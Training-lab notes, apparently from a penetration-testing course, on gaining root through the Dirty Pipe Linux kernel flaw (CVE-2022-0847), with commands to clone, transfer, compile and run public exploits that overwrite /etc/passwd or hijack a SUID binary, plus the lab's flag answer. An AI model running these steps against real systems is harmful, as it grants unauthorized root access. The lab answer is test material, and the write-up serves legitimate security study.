## ID
532

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 25 — Dirty Pipe

## Description
Covers privilege escalation via CVE-2022-0847 (Dirty Pipe), a Linux kernel vulnerability (5.8–5.17) that allows unauthorized writing to root-owned files, yielding instant root through `/etc/passwd` modification or SUID binary hijacking.

## Tags
dirty-pipe, cve-2022-0847, kernel, privilege-escalation, linux, pipes

## Commands
- `uname -r`
- `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`
- `scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@<TARGET_IP>:~/`
- `bash compile.sh`
- `./exploit-1`
- `./exploit-2 /usr/bin/<SUID_BINARY>`
- `find / -perm -4000 2>/dev/null`

## What This Section Covers
Dirty Pipe (CVE-2022-0847) is a Linux kernel vulnerability affecting versions 5.8 through 5.17 that exploits the pipe mechanism to allow any user with read access to a file to write arbitrary data to it. This is similar to the 2016 Dirty Cow vulnerability. Two exploit variants exist: exploit-1 overwrites `/etc/passwd` to set a known root password, and exploit-2 hijacks a SUID binary to drop a root shell. Android devices are also affected since apps run with user rights.

## Methodology
1. Verify the kernel version with `uname -r` — must be between 5.8 and 5.17 to be vulnerable.
2. Clone the Dirty Pipe exploit repo on your attack box: `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git`.
3. Transfer to the target: `scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@<TARGET_IP>:~/`.
4. SSH into the target and compile: `cd CVE-2022-0847-DirtyPipe-Exploits/ && bash compile.sh`.
5. **Exploit-1 (passwd overwrite):** Run `./exploit-1` — it backs up `/etc/passwd`, sets root password to "piped", pops a root shell, then restores the file.
6. **Exploit-2 (SUID hijack):** Find SUID binaries with `find / -perm -4000 2>/dev/null`, then run `./exploit-2 /usr/bin/<SUID_BINARY>` — it hijacks the binary, drops a SUID shell in `/tmp/sh`, and pops root.
7. Read the flag: `cat /root/flag.txt`.

## Multi-step Workflow
```
# On attack box
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
scp -r CVE-2022-0847-DirtyPipe-Exploits/ htb-student@<TARGET_IP>:~/

# On target
ssh htb-student@<TARGET_IP>
uname -r
cd CVE-2022-0847-DirtyPipe-Exploits/
bash compile.sh
./exploit-1
cat /root/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Escalate privileges and submit flag.txt | HTB{D1rTy_DiR7Y} | SSH in → `uname -r` confirms 5.15.0 (vulnerable) → clone and scp Dirty Pipe PoC → `bash compile.sh` → `./exploit-1` → root shell → `cat /root/flag.txt` |

## Key Takeaways
- Dirty Pipe requires no special permissions or sudo entries — just a vulnerable kernel version (5.8–5.17) and read access to the target file.
- Exploit-1 is cleaner for CTFs (modifies passwd, pops shell, restores the file automatically), while exploit-2 leaves a SUID shell in `/tmp/sh` that needs manual cleanup.
- Always check kernel version (`uname -r`) early in enumeration — kernel exploits like Dirty Pipe and Dirty Cow are often the fastest privesc path when applicable.
- The exploit modifies `/etc/passwd` on disk — in a real engagement, verify the backup/restore worked and document the change.
- Android phones running affected kernels are also vulnerable, making this relevant beyond traditional Linux pentesting.

## Gotchas
- Exploit-2 leaves `/tmp/sh` behind — always clean up with `rm /tmp/sh` after use, especially in a real engagement.
- The `compile.sh` script requires `gcc` on the target; if missing, compile both exploit binaries on a matching architecture and transfer them.
- Exploit-1 temporarily changes the root password in `/etc/passwd` — if it crashes mid-execution before restoring the backup, the system's passwd file will be corrupted. The backup is at `/tmp/passwd.bak`.
